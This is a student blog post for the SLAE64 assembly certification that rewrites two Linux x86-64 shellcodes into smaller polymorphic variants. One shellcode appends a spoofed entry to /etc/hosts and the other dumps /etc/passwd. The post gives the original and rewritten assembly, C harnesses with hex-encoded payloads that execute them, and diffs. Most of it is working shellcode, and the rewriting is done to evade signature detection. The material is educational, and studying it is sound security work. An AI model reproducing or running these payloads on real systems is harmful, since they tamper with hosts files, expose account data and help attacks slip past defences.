Assignment #6 – Writing polymorphic shellcodes
==============================================

In this assignment I had to choose three shellcodes from [Shell Storm][shell_storm_shellcode] and write polymorphic versions of them. Bonus points if your version is smaller than the original. I chose the following:

    Linux/x86-64 - Add map in /etc/hosts file - 110 bytes by Osanda Malith Jayathissa
    Linux/x86-64 - Read /etc/passwd - 82 bytes by Mr.Un1k0d3r


    $ curl -s http://shell-storm.org/shellcode/ | grep "Linux/x86-64" | shuf -n3
    <li><a href="/shellcode/files/shellcode-880.php">Linux/x86-64 - Add user and password with open,write,close - 358 bytes</a> <i>by Christophe G</i></li>
    <li><a href="/shellcode/files/shellcode-76.php">Linux/x86-64 - execve(/bin/sh, [/bin/sh], NULL) - 33 bytes</a> <i>by hophet</i></li>
    <li><a href="/shellcode/files/shellcode-879.php">Linux/x86-64 - Add user and password with echo cmd - 273 bytes</a> <i>by Christophe G</i></li>



Add map in `/etc/hosts` file - 110 bytes by [@OsandaMalith][@OsandaMalith]
--------------------------------------------------------------------------

The original shellcode can be found [here][shell_storm_shellcode_896]. It is reproduced below.

Doing a quick reverse we find this shellcode adds an entry to `/etc/hosts`, in this case `127.1.1.1 google.lk`.

    ; Title: Add map in /etc/hosts file - 110 bytes
    ; Date: 2014-10-29
    ; Platform: linux/x86_64
    ; Website: http://osandamalith.wordpress.com
    ; Author: Osanda Malith Jayathissa (@OsandaMalith)

    global _start
        section .text

    _start:
        ;open
        xor rax, rax 
        add rax, 2  ; open syscall
        xor rdi, rdi
        xor rsi, rsi
        push rsi ; 0x00 
        mov r8, 0x2f2f2f2f6374652f ; stsoh/
        mov r10, 0x7374736f682f2f2f ; /cte/
        push r10
        push r8
        add rdi, rsp
        xor rsi, rsi
        add si, 0x401
        syscall

        ;write
        xchg rax, rdi
        xor rax, rax
        add rax, 1 ; syscall for write
        jmp data

    write:
        pop rsi 
        mov dl, 19 ; length in rdx
        syscall

        ;close
        xor rax, rax
        add rax, 3
        syscall

        ;exit
        xor rax, rax
        mov al, 60
        xor rdi, rdi
        syscall 

    data:
        call write
        text db '127.1.1.1 google.lk'

My polymorphic version can be seen below. The first part was heavily altered and multiple size optimisations were introduced. The remaining parts had some instructions substituted by equivalent ones and some more optimisations (say `xor eax, eax` instead of `xor rax, rax`). In the end my polymorphic version works as the original but was cut from 110 bytes to 85. Neither the original nor my version include null bytes.

    global _start
        section .text

    _start:
        ;open
        ; rdi = *pathname
        ; rsi = 0x0401
        ; rax = 2
        push 2
        pop rax
        xor edi, edi
        push rdi                     ; null byte, terminate string
        push 0x7374736f              ; rax2 -S $(echo osts | rev)
        mov r9, 0x682f6374652f2f2f   ; rax2 -S $(echo ///etc/h | rev)
        push r9
        mov rdi, rsp
        push word 0x0401             ; O_WRONLY|O_APPEND
        pop si
        syscall

        ;write
        mov edi, eax
        xor eax, eax
        inc rax                      ; syscall for write
        jmp data

    write:
        pop rsi
        mov dl, 19                   ; length in rdx
        syscall

        ;close
        sub eax, eax
        add eax, 3
        syscall

        ;exit
        ;xor eax, eax                ; already done by close
        add al, 60
        xor edi, edi
        syscall

    data:
        call write
        text db '127.1.1.1 google.lk'


    #include <stdio.h>
    #include <string.h>

    char code[] =
    "\x6a\x02\x58\x31\xff\x57\x68\x6f\x73\x74\x73\x49\xb9\x2f\x2f\x2f\x65\x74"
    "\x63\x2f\x68\x41\x51\x48\x89\xe7\x66\x68\x01\x04\x66\x5e\x0f\x05\x89\xc7"
    "\x31\xc0\x48\xff\xc0\xeb\x12\x5e\xb2\x13\x0f\x05\x29\xc0\x83\xc0\x03\x0f"
    "\x05\x04\x3c\x31\xff\x0f\x05\xe8\xe9\xff\xff\xff\x31\x32\x37\x2e\x31\x2e"
    "\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x6c\x6b";

    int main() {
        printf("length: %lu\n", strlen(code));
        ((int(*)()) code)();
    }

Diff:

    $ diff <(nasm -E shellcode-896_add-map-in-etc-hosts.nasm) <(nasm -E shellcode-896_add-map-in-etc-hosts_polymorph.nasm) | grep -v "^[<>] $"

    1,7c1
    < %line 1+1 shellcode-896_add-map-in-etc-hosts.nasm
    ---
    > %line 1+1 shellcode-896_add-map-in-etc-hosts_polymorph.nasm
    13,24c7,19
    <  xor rax, rax
    <  add rax, 2
    <  xor rdi, rdi
    <  xor rsi, rsi
    <  push rsi
    <  mov r8, 0x2f2f2f2f6374652f
    <  mov r10, 0x7374736f682f2f2f
    <  push r10
    <  push r8
    <  add rdi, rsp
    <  xor rsi, rsi
    <  add si, 0x401
    ---
    >  push 2
    >  pop rax
    >  xor edi, edi
    >  push rdi
    >  push 0x7374736f
    >  mov r9, 0x682f6374652f2f2f
    >  push r9
    >  mov rdi, rsp
    >  push word 0x0401
    >  pop si
    28,30c23,25
    <  xchg rax, rdi
    <  xor rax, rax
    <  add rax, 1
    ---
    >  mov edi, eax
    >  xor eax, eax
    >  inc rax
    39,40c34,35
    <  xor rax, rax
    <  add rax, 3
    ---
    >  sub eax, eax
    >  add eax, 3
    44,46c39,41
    <  xor rax, rax
    <  mov al, 60
    <  xor rdi, rdi
    ---
    >  add al, 60
    >  xor edi, edi


Read `/etc/passwd` - 82 bytes by Mr.Un1k0d3r
--------------------------------------------

The original shellcode can be found [here][shell_storm_shellcode_878]. It is reproduced below. It simply opens `/etc/passwd`, reads its contents and writes them to stdout. The shellcode has no null bytes.

    BITS 64
    ; Author Mr.Un1k0d3r - RingZer0 Team
    ; Read /etc/passwd Linux x86_64 Shellcode
    ; Shellcode size 82 bytes
    global _start

    section .text

    _start:
    jmp _push_filename

    _readfile:
    ; syscall open file
    pop rdi ; pop path value
    ; NULL byte fix
    xor byte [rdi + 11], 0x41

    xor rax, rax
    add al, 2
    xor rsi, rsi ; set O_RDONLY flag
    syscall

    ; syscall read file
    sub sp, 0xfff
    lea rsi, [rsp]
    mov rdi, rax
    xor rdx, rdx
    mov dx, 0xfff; size to read
    xor rax, rax
    syscall

    ; syscall write to stdout
    xor rdi, rdi
    add dil, 1 ; set stdout fd = 1
    mov rdx, rax
    xor rax, rax
    add al, 1
    syscall

    ; syscall exit
    xor rax, rax
    add al, 60
    syscall

    _push_filename:
    call _readfile
    path: db "/etc/passwdA"

My polymorphic version is below. Other than equivalent (sometimes shorter) instructions substitutions the `read` part was a bit reworked to shorten it a bit. Also, the terminating character of the file path was replaced. The polymorphic version does not have null bytes either. The original shellcode is 82 bytes long, while the polymorphic version is 71.

    global _start
    section .text

    _start:
        jmp _push_filename

    _readfile:
        ; open
        pop rdi                     ; pop path value
        xor byte [rdi + 11], 0x5a   ; add null byte to string

        xor eax, eax
        xor esi, esi                ; set O_RDONLY flag
        mov al, 2                   ; __NR_open = 2
        syscall

        ; read
        xor edx, edx
        mov dx, 0xffe               ; size to read
        sub rsp, rdx
        mov rsi, rsp
        mov rdi, rax
        sub eax, eax                ; __NR_read = 0
        syscall

        ; write
        xor edi, edi
        inc dil                     ; stdout fd = 1
        mov rdx, rax
        xor eax, eax
        inc al                      ; __NR_write = 1
        syscall

        ; exit
        sub eax, eax
        mov al, 60
        syscall

    _push_filename:
        call _readfile
        path: db "/etc/passwdZ"


    #include <stdio.h>
    #include <string.h>

    char code[] =
    "\xeb\x34\x5f\x80\x77\x0b\x5a\x31\xc0\x31\xf6\xb0\x02\x0f\x05\x31\xd2\x66"
    "\xba\xfe\x0f\x48\x29\xd4\x48\x89\xe6\x48\x89\xc7\x29\xc0\x0f\x05\x31\xff"
    "\x40\xfe\xc7\x48\x89\xc2\x31\xc0\xfe\xc0\x0f\x05\x29\xc0\xb0\x3c\x0f\x05"
    "\xe8\xc7\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x5a";

    int main() {
        printf("length: %lu\n", strlen(code));
        ((int(*)()) code)();
    }

Diff:

    $ diff <(nasm -E shellcode-878_read-etc-passwd.nasm) <(nasm -E shellcode-878_read-etc-passwd_polymorph.nasm) | grep -v "^[<>] $"

    1,5c1
    < %line 1+1 shellcode-878_read-etc-passwd.nasm
    < [bits 64]
    ---
    > %line 1+1 shellcode-878_read-etc-passwd_polymorph.nasm
    15a12
    > xor byte [rdi + 11], 0x5a
    17,21c14,16
    < xor byte [rdi + 11], 0x41
    < xor rax, rax
    < add al, 2
    < xor rsi, rsi
    ---
    > xor eax, eax
    > xor esi, esi
    > mov al, 2
    25,26c20,23
    < sub sp, 0xfff
    < lea rsi, [rsp]
    ---
    > xor edx, edx
    > mov dx, 0xffe
    > sub rsp, rdx
    > mov rsi, rsp
    28,30c25
    < xor rdx, rdx
    < mov dx, 0xfff
    < xor rax, rax
    ---
    > sub eax, eax
    34,35c29,30
    < xor rdi, rdi
    < add dil, 1
    ---
    > xor edi, edi
    > inc dil
    37,38c32,33
    < xor rax, rax
    < add al, 1
    ---
    > xor eax, eax
    > inc al
    42,43c37,38
    < xor rax, rax
    < add al, 60
    ---
    > sub eax, eax
    > mov al, 60
    48c43
    < path: db "/etc/passwdA"
    ---
    > path: db "/etc/passwdZ"


[shell_storm_shellcode]: http://shell-storm.org/shellcode/
[shell_storm_shellcode_896]: http://shell-storm.org/shellcode/files/shellcode-896.php
[shell_storm_shellcode_878]: http://shell-storm.org/shellcode/files/shellcode-878.php

[@OsandaMalith]: https://twitter.com/OsandaMalith

----

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert][SLAE64] certification.

Student ID: SLAE64-1635

[SLAE64]: https://www.pentesteracademy.com/course?id=7
